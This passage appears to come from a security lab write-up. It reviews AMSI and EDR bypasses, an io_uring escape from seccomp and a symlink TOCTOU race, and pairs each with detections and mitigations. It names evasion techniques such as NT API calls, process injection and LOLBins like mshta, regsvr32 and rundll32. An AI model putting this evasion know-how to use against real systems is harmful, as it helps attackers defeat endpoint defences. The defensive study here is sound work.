   - Alert on `AmsiScanBuffer` returning `E_INVALIDARG` repeatedly
   - Use ETW to track memory protection changes in security-sensitive processes

2. Which bypass technique is most likely to evade EDR?
   - Execute-assembly (compiled .NET) - no AMSI scanning, only signature detection
   - Native code with NT API - bypasses Win32 API hooks that EDR monitors
   - Process injection with runtime-provided shellcode - no static signatures

3. How does .NET AMSI differ from PowerShell AMSI?
   - PowerShell: Scans every script block before execution
   - .NET: Only scans dynamic code (Assembly.Load from byte array)
   - Compiled assemblies: Not scanned at all (our execute-assembly approach)

4. What's the relationship between AMSI and ETW?
   - AMSI scans content, ETW logs events
   - Both can be bypassed independently
   - Defenders should monitor both for complete visibility

5. How would you bypass AMSI without compiling code?
   - Use execute-assembly with pre-compiled C# binary
   - Reflective PE loading (loads compiled binary from memory)
   - LOLBins that don't invoke AMSI (mshta, regsvr32, rundll32)

6. Why does io_uring bypass seccomp? Is this a bug or design limitation?
   - **Design limitation** - seccomp filters syscalls from userspace
   - io_uring operations execute in kernel worker threads (not syscalls)
   - seccomp BPF never sees the operations
   - Fixed in 6.6+ but requires `io_uring_disabled=2` to fully mitigate

7. How would you detect io_uring-based sandbox escapes?
   - Monitor `io_uring_setup()` syscalls in sandboxed processes
   - Use eBPF to track io_uring submission queue operations
   - Block io_uring entirely for unprivileged users (`io_uring_disabled=2`)
   - Audit container seccomp profiles to ensure io_uring syscalls are blocked

8. Why did the TOCTOU race succeed 33.6% of the time?
   - Race window between BPF LSM path check and actual file open
   - Symlink swap happens in microseconds
   - Kernel doesn't revalidate path after LSM check
   - Mitigation: Use Landlock LSM (inode-based, not path-based)

9. What's the most effective defense against these bypasses?
   - **Windows**: Tamper Protection + EDR with behavioral detection
   - **Linux**: `io_uring_disabled=2` + Landlock LSM + AppArmor/SELinux
   - **Both**: Defense in depth - don't rely on single security mechanism

